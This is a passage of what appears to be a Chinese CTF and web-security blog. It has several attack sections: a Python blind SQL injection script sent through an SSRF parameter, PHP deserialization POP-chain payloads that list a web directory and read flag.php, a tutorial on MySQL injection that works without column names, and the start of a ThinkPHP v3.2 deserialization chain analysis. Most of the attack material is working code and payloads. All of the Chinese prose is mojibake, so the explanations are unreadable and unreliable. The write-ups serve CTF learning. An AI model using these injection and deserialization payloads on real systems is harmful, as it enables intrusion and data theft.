class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">mydata = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">myfile = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;jtq4q3fdfgnckcrd52a6nhf90a&#x27;</span>&#125;</span><br><span class="line">ip = <span class="string">&#x27;http://183.129.189.60:10015/?url=&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ses=requests.session()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;http://localhost//se1f_Log3n.php?username=admin\&#x27;and 1=1%23password=admin&#x27;</span></span><br><span class="line">url = ip + quote(payload)</span><br><span class="line">r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/v3xsRomFOT4pNMi.png" alt="image-20210408125333703.png"></p>
<p>and 1=1 and 1=2è¿”å›ç»“æœä¸åŒ</p>
<p><img src="https://i.loli.net/2021/04/08/EU4xlF9ZoHLRSY8.png" alt="image-20210408125535401.png"></p>
<p>ç›²æ³¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">asc_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">mydata = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;mochu7&#x27;</span>&#125; </span><br><span class="line">myfile = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;mochu7.txt&#x27;</span>,<span class="string">&#x27;mochu7&#x27;</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;jtq4q3fdfgnckcrd52a6nhf90a&#x27;</span>&#125;</span><br><span class="line">ip = <span class="string">&#x27;http://183.129.189.60:10015/?url=&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ses=requests.session()</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> asc_str:</span><br><span class="line">        payload = <span class="string">&#x27;http://localhost//se1f_Log3n.php?username=mochu\&#x27;or ascii(mid((select flag from ctf.secret),&#123;&#125;,1))=&#123;&#125;%23password=mochu7&#x27;</span>.<span class="built_in">format</span>(l,<span class="built_in">ord</span>(s))</span><br><span class="line">        url = ip + quote(payload)</span><br><span class="line">        r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;correct?&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += s</span><br><span class="line">            print(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<p>å¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2021/04/08/HfSAWcwMKevJi1U.png" alt="image-20210408124649418.png"></p>
<h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><p>è°ƒç”¨å’ŒSplFileObjectå†…ç½®ç±»è¿›è¡Œååºåˆ—åŒ–ã€‚FilesystemIteratorç”¨äºéå†ç›®å½•æ–‡ä»¶ï¼ŒSplFileObjectç”¨äºè¯»å–æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>



<p>åˆ—å‡ºç›®å½•ä¸‹æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line">        <span class="comment">//echo new  $this-&gt;class ($this-&gt;para);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>



<p>å‘ç°ç›®å½•aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErEï¼Œç›®å½•ä¸‹å­˜åœ¨flag.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;76863e29-3ca5-4471-ac1a-57b8f52336b7.machine.dasctf.com&#x2F;?pop&#x3D;O%3A1%3A%22A%22%3A3%3A&#123;s%3A5%3A%22class%22%3Bs%3A18%3A%22FilesystemIterator%22%3Bs%3A4%3A%22para%22%3Bs%3A14%3A%22%2Fvar%2Fwww%2Fhtml%2F%22%3Bs%3A5%3A%22check%22%3BN%3B&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/W1Yx7u258UhrTAH.png" alt="image-20210327164433163.png"></p>
<p>å‘ç°ç›®å½•aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErEï¼Œç›®å½•ä¸‹å­˜åœ¨flag.php</p>
<p>è¯»å–æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">        <span class="comment">//echo new  $this-&gt;class ($this-&gt;para);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/Zxu8s3KSEatnDbT.png" alt="image-20210408131112136.png"></p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/115276176">https://blog.csdn.net/mochu7777777/article/details/115276176</a></p>
<p><a target="_blank" rel="noopener" href="https://www.plasf.cn/articles/dasctf202103.html">https://www.plasf.cn/articles/dasctf202103.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a></p>
<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/03/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/MAR%20DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/">https://whoamianony.top/2021/03/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/MAR%20DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-05T05:38:50.000Z" title="2021-04-05T05:38:50.000Z">2021-04-05</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-04-05T05:41:19.414Z" title="2021-04-05T05:41:19.414Z">2021-04-05</time>æ›´æ–°</span><span class="level-item">3 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦443ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">æ— åˆ—åæ³¨å…¥æ€»ç»“</a></h1><div class="content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨information_schemaè¢«è¿‡æ»¤æ—¶ï¼Œæ— æ³•è·å–åˆ°è¡¨åå’Œåˆ—åï¼Œè¿™æ—¶å€™å°±éœ€è¦é€šè¿‡æ— åˆ—åæ³¨å…¥æ¥è·å–ä¿¡æ¯ã€‚</p>
<h1 id="è·å–è¡¨å"><a href="#è·å–è¡¨å" class="headerlink" title="è·å–è¡¨å"></a>è·å–è¡¨å</h1><p>æ— åˆ—åæ³¨å…¥ä¹Ÿæ˜¯éœ€è¦è¡¨åçš„ï¼Œå¯ä»¥å…ˆé€šè¿‡InnoDbå’Œsysæ¥è·å–è¡¨å</p>
<h2 id="InnoDb"><a href="#InnoDb" class="headerlink" title="InnoDb"></a>InnoDb</h2><p>è¦æ±‚ï¼šMysqlç‰ˆæœ¬&gt;5.6</p>
<p>inndbä¸­æœ‰innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶ä¸­çš„æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚</p>
<p>æŸ¥è¯¢è¡¨å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database();</span><br></pre></td></tr></table></figure>



<h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>è¦æ±‚ï¼šMysqlç‰ˆæœ¬&gt;5.7</p>
<p>é€šè¿‡æŸ¥è¯¢sys.schema_table_statistics_with_bufferå’Œsys.schema_auto_increment_columnsè·å¾—è¡¨å</p>
<h3 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema&#x3D;database();</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/rGXQ39aUF2iejdp.png" alt="image-20210405132743251.png"></p>
<h3 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database();</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/fpPjoHKAIeC1kcV.png" alt="image-20210405132837988.png"></p>
<h1 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h1><p>æ— åˆ—åæ³¨å…¥çš„åŸç†æ˜¯ä¾é union selectæ—¶äº§ç”Ÿçš„è™šæ‹Ÿè¡¨æ¥æŸ¥è¯¢æ•°æ®ã€‚</p>
<p>æ­£å¸¸çš„è¡¨</p>
<p><img src="https://i.loli.net/2021/04/05/FDtjrXGe6RUHWP5.png" alt="image-20210405131730910.png"></p>
<p>union selectäº§ç”Ÿçš„è™šæ‹Ÿè¡¨ï¼Œå¿…é¡»ä¿è¯æŸ¥è¯¢åˆ—æ•°æ˜¯å‡†ç¡®çš„</p>
<p><img src="https://i.loli.net/2021/04/05/JpVIDu3oLfjya6z.png" alt="image-20210405131751893.png"></p>
<p>åªè¦ç»™è™šæ‹Ÿè¡¨å–ä¸€ä¸ªåˆ«åï¼Œå³å¯æŸ¥è¯¢å…¶ä¸­çš„æ•°æ®ï¼Œä¸‹é¢æŸ¥è¯¢äº†ç¬¬äºŒåˆ—çš„æ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;2&#96; from (select 1,2,3 union select * from users)n;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/Y2jrt3ITfaL5MNe.png" alt="image-20210405131922758.png"></p>
<p>åœ¨åå¼•å·è¢«è¿‡æ»¤æ—¶è¿˜å¯ä»¥ä½¿ç”¨ç»™åˆ—èµ·åˆ«åçš„æ–¹å¼æŸ¥è¯¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2 as b,3 union select * from users)n;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/6XKGLpoBsx4QWyR.png" alt="image-20210405132241116.png"></p>
<p>è¿˜å¯ä»¥ä½¿ç”¨<code>è¡¨å.åˆ—å</code>è¿™ç§å½¢å¼ï¼Œnæ˜¯æˆ‘ä»¬ç»™è™šæ‹Ÿè¡¨èµ·çš„åˆ«å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select n.2 from (select 1,2,3 union select * from users)n;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/05/1oPOW4lgibyE9rG.png" alt="image-20210405132353492.png"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-04T14:02:52.000Z" title="2021-04-04T14:02:52.000Z">2021-04-04</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-04-04T14:17:18.145Z" title="2021-04-04T14:17:18.145Z">2021-04-04</time>æ›´æ–°</span><span class="level-item">6 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦861ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/04/ThinkPHP-v3-2-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–å¤ç°</a></h1><div class="content"><p>å‚è€ƒ</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect</a></p>
<h1 id="æ­å»ºç¯å¢ƒ"><a href="#æ­å»ºç¯å¢ƒ" class="headerlink" title="æ­å»ºç¯å¢ƒ"></a>æ­å»ºç¯å¢ƒ</h1><p>æ¡†æ¶ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªé»˜è®¤æ§åˆ¶å™¨ï¼Œåœ¨é»˜è®¤æ§åˆ¶å™¨ä¸‹æ·»åŠ ä¸€ä¸ªæµ‹è¯•ç”¨çš„<code>Action</code>å³å¯ã€‚</p>
<p><img src="https://i.loli.net/2021/04/04/iLEek5D1lz3bgjP.png" alt="image-20210404213944476.png"></p>
<h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p><strong>1./ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</strong></p>
<p>$this-&gt;imgå¯æ§ï¼Œå¯»æ‰¾ç”±destoryæ–¹æ³•çš„ç±»</p>
<p><img src="https://i.loli.net/2021/04/04/oDcj2GmXh3uq4Ct.png" alt="image-20210404165131700.png"></p>
<p><strong>2./ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</strong></p>
<p>destroy()æ–¹æ³•ä¸­è°ƒç”¨delete()æ–¹æ³• ï¼Œ$this-&gt;handleå±æ€§å¯æ§ï¼Œå¯ä¼ å…¥ä»»æ„ç±»å¹¶è°ƒç”¨å®ƒçš„delete()æ–¹æ³•ã€‚<code>destroy()</code>æ–¹æ³•éœ€è¦ä¼ å…¥ä¸€ä¸ª<code>$sessID</code>ï¼Œä½†æ˜¯å‰é¢è°ƒç”¨<code>destroy()</code>æ²¡æœ‰ä¼ å€¼ï¼Œè€Œ<code>$this-&gt;sessionName</code>å¯æ§ï¼Œè¿™æ ·æ•´ä¸ªä¼ å…¥çš„å‚æ•°éƒ½å¯æ§</p>
<p><img src="https://i.loli.net/2021/04/04/uOkjS3M1wNxGe5f.png" alt="image-20210404191359058.png"></p>
<p><strong>3./ThinkPHP/Library/Think/Model.class.php</strong></p>
